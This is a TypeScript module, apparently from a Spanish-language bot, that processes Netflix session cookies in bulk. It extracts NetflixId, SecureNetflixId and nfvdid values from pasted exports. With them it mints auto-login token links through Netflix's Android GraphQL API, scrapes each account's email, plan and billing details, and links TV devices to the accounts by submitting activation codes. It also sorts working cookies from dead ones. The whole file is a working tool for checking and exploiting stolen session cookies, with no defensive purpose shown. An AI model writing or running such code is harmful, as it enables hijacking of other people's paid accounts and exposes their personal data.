import axios from 'axios'

// ── Types ────────────────────────────────────────────────────────────────────
interface CookieDict { [key: string]: string }

export interface NFTokenResult {
  success: boolean
  token?: string
  link?: string
  error?: string
}

export interface NetflixMetadata {
  success: boolean
  country?: string
  countryName?: string
  plan?: string
  planPrice?: string
  videoQuality?: string
  maxStreams?: string
  nextBillingDate?: string
  memberSince?: string
  email?: string
  error?: string
}

export interface CheckResult {
  success: boolean
  token?: string
  link?: string
  metadata?: NetflixMetadata
  error?: string
}

export interface TVActivateResult {
  success: boolean
  dead?: boolean
  error?: string
}

// ── Countries ────────────────────────────────────────────────────────────────
export const COUNTRIES: { [code: string]: { name: string; flag: string } } = {
  'US': { name: 'Estados Unidos', flag: '🇺🇸' },
  'MX': { name: 'México', flag: '🇲🇽' },
  'PE': { name: 'Perú', flag: '🇵🇪' },
  'CO': { name: 'Colombia', flag: '🇨🇴' },
  'AR': { name: 'Argentina', flag: '🇦🇷' },
  'CL': { name: 'Chile', flag: '🇨🇱' },
  'BR': { name: 'Brasil', flag: '🇧🇷' },
  'ES': { name: 'España', flag: '🇪🇸' },
  'CA': { name: 'Canadá', flag: '🇨🇦' },
  'DE': { name: 'Alemania', flag: '🇩🇪' },
  'FR': { name: 'Francia', flag: '🇫🇷' },
  'GB': { name: 'Reino Unido', flag: '🇬🇧' },
  'JP': { name: 'Japón', flag: '🇯🇵' },
  'IT': { name: 'Italia', flag: '🇮🇹' },
  'AU': { name: 'Australia', flag: '🇦🇺' },
  'NL': { name: 'Países Bajos', flag: '🇳🇱' },
  'SE': { name: 'Suecia', flag: '🇸🇪' },
  'NO': { name: 'Noruega', flag: '🇳🇴' },
  'DK': { name: 'Dinamarca', flag: '🇩🇰' },
  'FI': { name: 'Finlandia', flag: '🇫🇮' },
  'BE': { name: 'Bélgica', flag: '🇧🇪' },
  'AT': { name: 'Austria', flag: '🇦🇹' },
  'CH': { name: 'Suiza', flag: '🇨🇭' },
  'PT': { name: 'Portugal', flag: '🇵🇹' },
  'PL': { name: 'Polonia', flag: '🇵🇱' },
  'CZ': { name: 'República Checa', flag: '🇨🇿' },
  'HU': { name: 'Hungría', flag: '🇭🇺' },
  'RO': { name: 'Rumania', flag: '🇷🇴' },
  'BG': { name: 'Bulgaria', flag: '🇧🇬' },
  'HR': { name: 'Croacia', flag: '🇭🇷' },
  'SK': { name: 'Eslovaquia', flag: '🇸🇰' },
  'SI': { name: 'Eslovenia', flag: '🇸🇮' },
  'EE': { name: 'Estonia', flag: '🇪🇪' },
  'LV': { name: 'Letonia', flag: '🇱🇻' },
  'LT': { name: 'Lituania', flag: '🇱🇹' },
  'GR': { name: 'Grecia', flag: '🇬🇷' },
  'TR': { name: 'Turquía', flag: '🇹🇷' },
  'IL': { name: 'Israel', flag: '🇮🇱' },
  'ZA': { name: 'Sudáfrica', flag: '🇿🇦' },
  'NG': { name: 'Nigeria', flag: '🇳🇬' },
  'EG': { name: 'Egipto', flag: '🇪🇬' },
  'KR': { name: 'Corea del Sur', flag: '🇰🇷' },
  'TW': { name: 'Taiwán', flag: '🇹🇼' },
  'HK': { name: 'Hong Kong', flag: '🇭🇰' },
  'SG': { name: 'Singapur', flag: '🇸🇬' },
  'TH': { name: 'Tailandia', flag: '🇹🇭' },
  'PH': { name: 'Filipinas', flag: '🇵🇭' },
  'MY': { name: 'Malasia', flag: '🇲🇾' },
  'ID': { name: 'Indonesia', flag: '🇮🇩' },
  'IN': { name: 'India', flag: '🇮🇳' },
  'EC': { name: 'Ecuador', flag: '🇪🇨' },
  'VE': { name: 'Venezuela', flag: '🇻🇪' },
  'UY': { name: 'Uruguay', flag: '🇺🇾' },
  'PY': { name: 'Paraguay', flag: '🇵🇾' },
  'BO': { name: 'Bolivia', flag: '🇧🇴' },
  'DO': { name: 'República Dominicana', flag: '🇩🇴' },
  'PA': { name: 'Panamá', flag: '🇵🇦' },
  'CR': { name: 'Costa Rica', flag: '🇨🇷' },
  'GT': { name: 'Guatemala', flag: '🇬🇹' },
  'SV': { name: 'El Salvador', flag: '🇸🇻' },
  'HN': { name: 'Honduras', flag: '🇭🇳' },
  'NI': { name: 'Nicaragua', flag: '🇳🇮' },
  'CU': { name: 'Cuba', flag: '🇨🇺' },
  'NZ': { name: 'Nueva Zelanda', flag: '🇳🇿' },
  'AE': { name: 'Emiratos Árabes', flag: '🇦🇪' },
  'SA': { name: 'Arabia Saudita', flag: '🇸🇦' },
}

// ── Cookie Extraction ────────────────────────────────────────────────────────
export function extractCookiesFromText(text: string): CookieDict | null {
  // JSON format (Cookie Editor export)
  try {
    const data = JSON.parse(text)
    if (Array.isArray(data)) {
      const cd: CookieDict = {}
      for (const item of data) {
        if (item?.name && item?.value &&
          ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'].includes(item.name))
          cd[item.name] = item.value
      }
      if (cd.NetflixId) return cd
    }
  } catch {}

  // Netscape format
  if (text.includes('\t') && (text.includes('NetflixId') || text.includes('nfvdid'))) {
    const cd: CookieDict = {}
    for (const line of text.split('\n')) {
      if (!line.trim() || line.startsWith('#')) continue
      const parts = line.trim().split('\t')
      if (parts.length >= 7) cd[parts[5]] = parts[6]
    }
    if (cd.NetflixId) return cd
  }

  // Raw string format
  const cd: CookieDict = {}
  for (const [name, regex] of Object.entries({
    nfvdid: /nfvdid=([^;]+)/,
    NetflixId: /NetflixId=([^;]+)/,
    SecureNetflixId: /SecureNetflixId=([^;]+)/,
    OptanonConsent: /OptanonConsent=([^;]+)/,
  })) {
    const m = text.match(regex as RegExp)
    if (m) cd[name] = m[1]
  }
  if (cd.NetflixId) return cd

  return null
}

export function extractCookiesFromBlock(text: string): CookieDict[] {
  const results: CookieDict[] = []
  if (!text || !text.trim()) return results

  const blocks = text.split(/\n\s*\n/)
  for (const block of blocks) {
    const trimmed = block.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const dict = extractCookiesFromText(trimmed)
    if (dict) {
      results.push(dict)
      continue
    }
    const lines = trimmed.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'))
    for (const line of lines) {
      const lineDict = extractCookiesFromText(line)
      if (lineDict) results.push(lineDict)
    }
  }
  return results
}

// ── Cookie String Builder ────────────────────────────────────────────────────
export function buildCookieString(cd: CookieDict, onlyAndroid = false): string {
  const keys = onlyAndroid ? ['NetflixId', 'SecureNetflixId', 'nfvdid'] : Object.keys(cd)
  return keys.filter(k => cd[k]).map(k => `${k}=${cd[k]}`).join('; ')
}

// ── NFToken Generation ───────────────────────────────────────────────────────
export async function generateToken(cd: CookieDict): Promise<NFTokenResult> {
  const missing = ['NetflixId', 'SecureNetflixId', 'nfvdid'].filter(k => !cd[k])
  if (missing.length) return { success: false, error: `Faltan cookies: ${missing.join(', ')}` }

  try {
    const { data } = await axios.post(
      'https://android13.prod.ftl.netflix.com/graphql',
      {
        operationName: 'CreateAutoLoginToken',
        variables: { scope: 'WEBVIEW_MOBILE_STREAMING' },
        extensions: {
          persistedQuery: {
            version: 102,
            id: '76e97129-f4b5-41a0-a73c-12e674896849',
          },
        },
      },
      {
        headers: {
          'User-Agent':
            'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
          'Content-Type': 'application/json',
          Cookie: buildCookieString(cd, true),
        },
        timeout: 30000,
      }
    )

    const token = data?.data?.createAutoLoginToken
    if (token) {
      return { success: true, token, link: `https://netflix.com/?nftoken=${token}` }
    }
    return { success: false, error: 'Sin token en respuesta' }
  } catch (e: any) {
    return { success: false, error: e.response?.data?.message || e.message || 'Error de red' }
  }
}

// ── Netflix Metadata ─────────────────────────────────────────────────────────
export async function getMetadata(cd: CookieDict): Promise<NetflixMetadata> {
  try {
    const res = await axios.get('https://www.netflix.com/account/membership', {
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        Cookie: buildCookieString(cd),
      },
      maxRedirects: 0,
      validateStatus: (s: number) => s < 400,
      timeout: 20000,
    })

    if (res.status >= 300) return { success: false, error: 'Cookie inválida (redirect)' }

    const html: string = res.data
    const match = html.match(/netflix\.reactContext\s*=\s*(\{.+?\})(?=;\s*<\/script>)/s)
    if (!match) return { success: false, error: 'No se pudo extraer metadata' }

    const rc = JSON.parse(
      match[1].replace(
        /\\x([0-9a-fA-F]{2})/g,
        (_: string, h: string) => String.fromCharCode(parseInt(h, 16))
      )
    )

    const models = rc?.models || {}
    const sc = models?.signupContext?.data || {}
    const fields = sc?.flow?.fields || {}
    const plan = fields?.currentPlan?.fields || {}
    const dig = (obj: any, ...keys: string[]): any =>
      keys.reduce((o, k) => (o && typeof o === 'object' ? o[k] : undefined), obj)

    return {
      success: true,
      country: dig(sc, 'userInfo', 'countryOfSignup'),
      plan: plan?.localizedPlanName?.value,
      planPrice: plan?.planPrice?.value,
      videoQuality: plan?.videoQuality?.value,
      maxStreams: plan?.maxStreams?.value,
      nextBillingDate: plan?.nextBillingDate?.value || fields?.nextBillingDate?.value,
      memberSince: plan?.memberSince?.value
        ? new Date(plan.memberSince.value).toISOString().split('T')[0]
        : undefined,
      email: models?.accountInfo?.data?.emailAddress,
    }
  } catch (e: any) {
    return { success: false, error: e.message }
  }
}

// ── Full Check (Token + Metadata) ────────────────────────────────────────────
export async function fullCheck(cookieText: string): Promise<CheckResult> {
  const cd = extractCookiesFromText(cookieText)
  if (!cd) return { success: false, error: 'No se pudieron extraer cookies válidas' }

  const tokenResult = await generateToken(cd)
  if (!tokenResult.success) return { success: false, error: tokenResult.error }

  const metadata = await getMetadata(cd)

  return {
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  }
}

// ── Country Detection from NetflixId ─────────────────────────────────────────
export function extractCountryFromNetflixId(netflixIdValue: string): string | null {
  try {
    const parts = netflixIdValue.split('|')
    if (parts.length < 3) return null

    const base64Part = parts[2]
    if (!base64Part) return null

    // Add padding if needed
    const padded = base64Part + '='.repeat((4 - base64Part.length % 4) % 4)
    const decoded = Buffer.from(padded, 'base64').toString('utf-8')
    const json = JSON.parse(decoded)

    const dig = (obj: any, ...keys: string[]): any =>
      keys.reduce((o, k) => (o && typeof o === 'object' ? o[k] : undefined), obj)

    return (
      dig(json, 'customerInfo', 'country') ||
      dig(json, 'user', 'country') ||
      dig(json, 'geo', 'country') ||
      dig(json, 'authInfo', 'country') ||
      null
    )
  } catch {
    return null
  }
}

// ── TV Activation (exact port from workspace/tv-activate) ──────────────────
const TV_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'

function getVal(html: string, key: string): string | null {
  const m = html.match(new RegExp(`"${key}"\\s*:\\s*"([^"]+)"`))
  return m ? m[1] : null
}

function getAuthURL(html: string): string | null {
  const inputMatch = html.match(/name="authURL"\s+value="([^"]+)"/)
  if (inputMatch) return inputMatch[1]
  return getVal(html, 'authURL')
}

export async function activateTV(cd: CookieDict, code: string): Promise<TVActivateResult> {
  if (!cd.NetflixId || !cd.SecureNetflixId) {
    return { success: false, error: 'Faltan cookies requeridas (NetflixId, SecureNetflixId)' }
  }

  if (!/^\d{8}$/.test(code)) {
    return { success: false, error: 'El código debe tener 8 dígitos' }
  }

  const rawCookie = buildCookieString(cd, false)
  console.log('[TV] Step 1: GET /tv8 ...')

  // ── Step 1: GET /tv8 ──
  let getRes: any
  try {
    getRes = await axios.get('https://www.netflix.com/tv8', {
      headers: {
        'User-Agent': TV_UA,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        Cookie: rawCookie,
      },
      maxRedirects: 0,
      validateStatus: () => true,
      timeout: 25000,
    })
  } catch (e: any) {
    console.log('[TV] GET /tv8 error:', e.message)
    return { success: false, error: `Error de conexión GET: ${e.message}` }
  }

  console.log('[TV] GET /tv8 status:', getRes.status)

  // Redirect = dead cookie
  if ([301, 302, 303, 307].includes(getRes.status)) {
    const loc = getRes.headers?.location || ''
    console.log('[TV] Redirect to:', loc)
    return { success: false, dead: true, error: 'Cookie expirada (redirige a login)' }
  }

  if (getRes.status !== 200) {
    return { success: false, dead: true, error: `Cookie no válida (HTTP ${getRes.status})` }
  }

  const html: string = getRes.data

  // Check membership
  const membershipStatus = getVal(html, 'membershipStatus')
  console.log('[TV] membershipStatus:', membershipStatus)

  if (membershipStatus !== 'CURRENT_MEMBER') {
    return { success: false, dead: true, error: `Cookie sin suscripción activa (estado: ${membershipStatus || 'UNKNOWN'})` }
  }

  // Extract authURL
  const authURL = getAuthURL(html)
  console.log('[TV] authURL:', authURL ? 'OK (' + authURL.substring(0, 20) + '...)' : 'NOT FOUND')

  if (!authURL) {
    return { success: false, error: 'No se pudo obtener authURL de Netflix' }
  }

  // ── Step 2: POST /tv8 ──
  console.log('[TV] Step 2: POST /tv8 with code', code)

  const payload = new URLSearchParams({
    flow: 'websiteSignUp',
    authURL: authURL,
    flowMode: 'enterTvLoginRendezvousCode',
    withFields: 'tvLoginRendezvousCode,isTvUrl2',
    tvLoginRendezvousCode: code,
    action: 'nextAction',
  })

  let postRes: any
  try {
    postRes = await axios.post(
      'https://www.netflix.com/tv8',
      payload.toString(),
      {
        headers: {
          'User-Agent': TV_UA,
          'Cookie': rawCookie,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': 'https://www.netflix.com/tv8',
          'Origin': 'https://www.netflix.com',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
        maxRedirects: 0,
        validateStatus: () => true,
        timeout: 25000,
      }
    )
  } catch (e: any) {
    console.log('[TV] POST /tv8 error:', e.message)
    return { success: false, error: `Error de conexión POST: ${e.message}` }
  }

  console.log('[TV] POST /tv8 status:', postRes.status)

  // ── Step 3: Parse result ──
  if ([301, 302, 303, 307].includes(postRes.status)) {
    const location = postRes.headers?.location || ''
    console.log('[TV] POST redirect to:', location)
    if (location.includes('/tv/out/success')) {
      return { success: true }
    }
    if (location.includes('/login')) {
      return { success: false, dead: true, error: 'La sesión cayó al intentar activar. Intenta de nuevo.' }
    }
    return { success: false, error: `Redirección inesperada: ${location}` }
  }

  // Non-redirect response — check for error in HTML
  const errText = typeof postRes.data === 'string' ? postRes.data : ''
  const nfMessage = errText.match(/class="nf-message-contents"[^>]*>([\s\S]*?)<\/div>/)
  const errorMessage = nfMessage ? nfMessage[1].trim() : `Error al enviar código (HTTP ${postRes.status}). Verifica e intenta.`
  console.log('[TV] Error message:', errorMessage)

  return { success: false, error: errorMessage }
}

// ── Helpers ──────────────────────────────────────────────────────────────────
export function getPlanType(planName: string): string {
  if (!planName) return 'Unknown'
  const p = planName.toLowerCase()
  if (p.includes('premium')) return 'Premium'
  if (p.includes('standard')) return 'Standard'
  if (p.includes('basic')) return 'Basic'
  if (p.includes('essential')) return 'Essential'
  if (p.includes('mobile')) return 'Mobile'
  return planName
}

export function getProgressBar(current: number, total: number, length = 10): string {
  const percent = total > 0 ? current / total : 0
  const filled = Math.floor(length * percent)
  return `[${'▓'.repeat(filled)}${'░'.repeat(length - filled)}] ${Math.floor(percent * 100)}%`
}
